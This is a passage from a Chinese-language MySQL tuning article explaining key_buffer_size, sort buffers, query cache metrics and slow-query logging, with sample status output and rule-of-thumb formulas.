 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>表扫描率 ＝ handler_read_rnd_next / com_select</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>如果表扫描率超过 4000，说明进行了太多表扫描，很有可能索引没有建好，增加 read_buffer_size 值会有一些好处，但最好不要超过8mb。</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.3 key_buffer_size</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>key_buffer_size是对myisam表性能影响最大的一个参数，下面一台以myisam为主要存储引擎服务器的配置：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables like ‘key_buffer_size‘;&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------+------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　 | value　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------+------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| key_buffer_size | 536870912 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-----------------+------------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>分配了 512mb 内存给 key_buffer_size ，我们再看一下 key_buffer_size 的使用情况：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘key_read%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　　| value　 　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| key_read_requests　　 | 27813678764 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| key_reads　　　　　　 | 6798830　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;一共有 27813678764个 索引读取请求，有 6798830个 请求在内存中没有找到直接从硬盘读取索引，计算索引未命中缓存的概率：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>key_cache_miss_rate ＝ key_reads / key_read_requests * 100%</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>比如上面的数据，key_cache_miss_rate为0.0244%，4000个索引读取请求才有一个直接读硬盘，已经很bt了，key_cache_miss_rate在0.1%以下都很好（每1000个请求有一个直接读硬盘），如果key_cache_miss_rate在0.01%以下的话，key_buffer_size分配的过多，可以适当减少。</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>【注意】key_read_buffer 默认值为 8M 。在专有的数据库服务器上，该值可设置为 RAM * 1/4</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql服务器还提供了key_blocks_*参数：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘key_blocks_u%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　 | value　　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------+-------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| key_blocks_unused　　| 0　　　　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| key_blocks_used　　　 | 413543 &nbsp;　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------+-------------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>key_blocks_unused 表示未使用的缓存簇(blocks)数</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>key_blocks_used 表示曾经用到的最大的blocks数</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>比如这台服务器，所有的缓存都用到了，要么增加 key_buffer_size，要么就是过渡索引了，把缓存占满了。比较理想的设置：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>key_blocks_used / (key_blocks_unused + key_blocks_used) * 100% ≈ 80%</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>3.4 排序使用情况 sort_buffer</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘sort%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　 | value　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+------------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| sort_merge_passes | 29　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| sort_range　　　　| 37432840　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| sort_rows　　　　 | 9178691532 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| sort_scan　　　　 | 1860569　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------+------------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>sort_merge_passes 包括两步。mysql 首先会尝试在内存中做排序，使用的内存大小由系统变量 sort_buffer_size 决定，如果它的大小不够把所有的记录都读到内存中，mysql 就会把每次在内存中排序的结果存到临时文件中，等 mysql 找到所有记录之后，再把临时文件中的记录做一次排序。这再次排序就会增加 sort_merge_passes。实际上，mysql 会用另一个临时文件来存再次排序的结果，所以通常会看到 sort_merge_passes 增加的数值是建临时文件数的两倍。因为用到了临时文件，所以速度可能会比较慢，增加 sort_buffer_size 会减少 sort_merge_passes 和 创建临时文件的次数。但盲目的增加 sort_buffer_size 并不一定能提高速度，见 how fast can you sort data with mysql?（引自<a href='http://qroom.blogspot.com/2007/09/mysql-select-sort.html' style='color:rgb(52, 104, 164);'>http://qroom.blogspot.com/2007/09/mysql-select-sort.html</a><span>&nbsp;</span>，貌似被墙）&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>另外，增加read_rnd_buffer_size(3.2.3是record_rnd_buffer_size)的值对排序的操作也有一点的好处，参见：<a href='http://www.mysqlperformanceblog.com/2007/07/24/what-exactly-is-read_rnd_buffer_size/' style='color:rgb(52, 104, 164);'>http://www.mysqlperformanceblog.com/2007/07/24/what-exactly-is-read_rnd_buffer_size/</a></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong><span>3.5 查询缓存</span></strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘qcache%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　　| value　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_free_blocks　 &nbsp; | 22756　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_free_memory　| 76764704　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_hits　　　　　　| 213028692 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_inserts　　　　 | 208894227 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_lowmem_prunes | 4010916 &nbsp;|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_not_cached　　| 13385031 &nbsp;|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_queries_in_cache | 43560　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| qcache_total_blocks　 | 111212 &nbsp;　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+-------------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;mysql 查询缓存变量解释：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_free_blocks：缓存中相邻内存块的个数。数目大说明可能有碎片。flush query cache会对缓存中的碎片进行整理，从而得到一个空闲块。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_free_memory：缓存中的空闲内存。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_hits：每次查询在缓存中命中时就增大&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_inserts：每次插入一个查询时就增大。命中次数除以插入次数就是命中比率。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_lowmem_prunes：缓存出现内存不足并且必须要进行清理以便为更多查询提供空间的次数。这个数字最好长时间来看；如果这个数字在不断增长，就表示可能碎片非常严重，或者内存很少。（上面的 free_blocks和free_memory可以告诉您属于哪种情况）&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_not_cached：不适合进行缓存的查询的数量，通常是由于这些查询不是 select 语句或者用了now()之类的函数。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_queries_in_cache：当前缓存的查询（和响应）的数量。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>qcache_total_blocks：缓存中块的数量。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>我们再查询一下服务器关于query_cache的配置：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables like ‘query_cache%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　　　　　 | value　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------------+-----------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| query_cache_limit　　　　　 | 2097152　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| query_cache_min_res_unit　| 4096　　　|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| query_cache_size　　　　　 &nbsp;| 203423744 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| query_cache_type　　　　　| on　　　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| query_cache_wlock_invalidate | off　　 &nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------------------+----------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>各字段的解释：&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>query_cache_limit：超过此大小的查询将不缓存&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>query_cache_min_res_unit：缓存块的最小大小&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>query_cache_size：查询缓存大小&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>query_cache_type：缓存类型，决定缓存什么样的查询，示例中表示不缓存 select sql_no_cache 查询</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>query_cache_wlock_invalidate：当有其他客户端正在对myisam表进行写操作时，如果查询在query cache中，是否返回cache结果还是等写操作完成再读表获取结果。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>query_cache_min_res_unit的配置是一柄”双刃剑”，默认是4kb，设置值大对大数据查询有好处，但如果你的查询都是小数据查询，就容易造成内存碎片和浪费。</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>查询缓存碎片率 = qcache_free_blocks / qcache_total_blocks * 100%</span>&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>如果查询缓存碎片率超过20%，可以用flush query cache整理缓存碎片，或者试试减小query_cache_min_res_unit，如果你的查询都是小数据量的话。&nbsp;</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>查询缓存利用率 = (query_cache_size - qcache_free_memory) / query_cache_size * 100%&nbsp;</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>查询缓存利用率在25%以下的话说明query_cache_size设置的过大，可适当减小；查询缓存利用率在80％以上而且qcache_lowmem_prunes &gt; 50的话说明query_cache_size可能有点小，要不就是碎片太多。</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>查询缓存命中率 = (qcache_hits - qcache_inserts) / qcache_hits * 100%&nbsp;</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><span style='color:rgb(255, 0, 0);'>示例服务器 查询缓存碎片率 ＝ 20.46％，查询缓存利用率 ＝ 62.26％，查询缓存命中率 ＝ 1.94％，命中率很差，可能写操作比较频繁吧，而且可能有些碎片。</span></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>4 其他</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>4.1 read_buffer_size</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'><strong>4.2 慢查询</strong></p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show variables like ‘%slow%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　 &nbsp; | value &nbsp;|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| log_slow_queries | on　　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| slow_launch_time | 2　 　 |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>mysql&gt; show global status like ‘%slow%‘;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| variable_name　　　 | value &nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------------+-------+</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| slow_launch_threads | 0&nbsp; 　 &nbsp;|</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>| slow_queries　　　　| 4148&nbsp; |</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>+---------------------+-------+&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>配置中打开了记录慢查询，执行时间超过2秒的即为慢查询，系统显示有4148个慢查询，你可以分析慢查询日志，找出有问题的sql语句，慢查询时间不宜设置过长，否则意义不大，最好在5秒以内，如果你需要微秒级别的慢查询，可以考虑给mysql打补丁：<a href='http://www.percona.com/docs/wiki/release:start' style='color:rgb(52, 104, 164);'>http://www.percona.com/docs/wiki/release:start</a>，记得找对应的版本。&nbsp;</p> 
 <p style='background-color:rgb(255, 255, 255);color:rgb(75, 75, 75);font-family:Verdana, Arial, Helvetica, sans-serif;font-size:13px;font-style:normal;font-weight:normal;text-align:start;'>打开慢查询日志可能会对系统性能有一点点影响，如果你的mysql是主－从结构，可以考虑打开其中一台从服务器的慢查询日志，这样既可以监控慢查询，对系统性能影响又小。</p> 
